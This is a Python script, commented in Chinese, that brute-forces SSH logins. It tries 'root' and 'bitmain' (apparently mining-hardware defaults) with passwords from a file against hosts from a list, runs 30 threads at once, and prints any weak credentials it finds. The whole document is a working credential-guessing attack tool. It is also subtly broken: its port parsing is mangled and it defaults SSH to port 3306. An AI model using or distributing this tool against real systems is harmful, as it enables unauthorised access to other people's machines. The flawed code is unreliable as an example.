from pexpect import pxssh, spawn
from threading import *
maxConnections = 30
connection_lock = BoundedSemaphore(value=maxConnections)

plugin = 'ssh'

usernames = ['root', 'bitmain']

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

with open('hosts.txt', 'r') as f:
    ips = f.readlines()


def connect(host, user, password, port):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port)
        print('发现弱口令：' + host + ' ' + str(port) + ' ' + user + ' ' + password)

    except Exception as e:
        print(e)
        # if 'read_nonblocking' in str(e): # 这个字符串表示主机连接次数过多,ssh不对外提供服务
        #     Failes += 1
        #     time.sleep(5)  # 休息5秒
        #     connect(host, user, password, False)  # 重新调用connect函数
    finally:
        connection_lock.release()


def ssh_brute(ip):
    # print("[%s] %s" % (plugin, ip))
    if ':' in ip:
        ip = ip.split(':')[0]
        port = ip.split(':')[1]
    else:
        port = 3306
    for username in usernames:
        for password in passwords:
            password = password.strip()
            connection_lock.acquire()  # 锁定
            password = password.strip()
            # print('test：' + ip + ' ' + str(port) + ' ' + username + ' ' + password)

            t = Thread(target=connect, args=(ip, username, password, port))
            t.start()



# with open('usernames.txt', 'r') as f:
#     usernames = f.readlines()


for ip in ips:
    try:
        ip = ip.strip()
        ssh_brute(ip)
    except Exception as e:
        print(e)